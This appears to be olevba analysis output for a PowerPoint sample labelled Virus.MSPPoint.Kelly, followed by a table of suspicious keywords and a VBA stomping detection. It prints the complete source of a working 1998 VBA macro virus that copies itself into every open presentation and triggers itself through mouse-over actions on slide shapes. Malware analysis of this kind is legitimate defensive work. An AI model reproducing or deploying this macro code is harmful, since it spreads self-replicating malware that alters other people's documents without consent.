olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSPPoint.Kelly
Type: PPT
-------------------------------------------------------------------------------
VBA MACRO Kelly.bas 
in file: None - OLE stream: 'VBA/Kelly'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Kelly
Sub ι(Kelly)
On Error Resume Next
Set α = ActivePresentation.VBProject.VBComponents("Kelly").CodeModule
ν = α.CountOfLines + 1: λ = α.Lines(1, ν)
For Each ν In Presentations
If ν.VBProject.VBComponents(α).Name <> α Then
ν.VBProject.VBComponents.Add(1).Name = α
ν.VBProject.VBComponents(α).CodeModule.InsertLines 1, λ
For Each η In ν.Slides(ν.Slides.Count).Shapes
If η.ActionSettings(ppMouseOver).Action = 0 Then _
η.ActionSettings(ppMouseOver).Action = ppActionRunMacro: _
η.ActionSettings(ppMouseOver).Run = "ι"
Next: End If: Next
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

